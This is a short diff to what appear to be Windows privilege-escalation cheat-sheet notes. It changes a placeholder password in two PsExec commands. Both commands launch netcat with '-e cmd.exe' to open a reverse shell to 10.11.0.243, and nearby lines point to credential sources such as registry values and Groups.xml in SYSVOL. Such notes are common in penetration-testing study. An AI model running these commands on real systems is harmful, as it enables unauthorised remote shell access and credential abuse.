@@ -107,9 +107,9 @@ where the last argument is the registry value of "password"
 
 
 === Found any credentials?
-PsExec.exe /accepteula -u user -p userishere -s C:\Users\Administrator\Desktop\nc.exe -nv 10.11.0.243 4444 -e cmd.exe
+PsExec.exe /accepteula -u user -p password -s C:\Users\Administrator\Desktop\nc.exe -nv 10.11.0.243 4444 -e cmd.exe
 
-PsExec.exe /accepteula -u user -p userishere "C:\HFS\nc.exe" -nv 10.11.0.243 21 -e cmd.exe
+PsExec.exe /accepteula -u user -p password "C:\HFS\nc.exe" -nv 10.11.0.243 21 -e cmd.exe
 
 === Group Policy Preference XML files:
 Groups.xml stored in SYSVOL
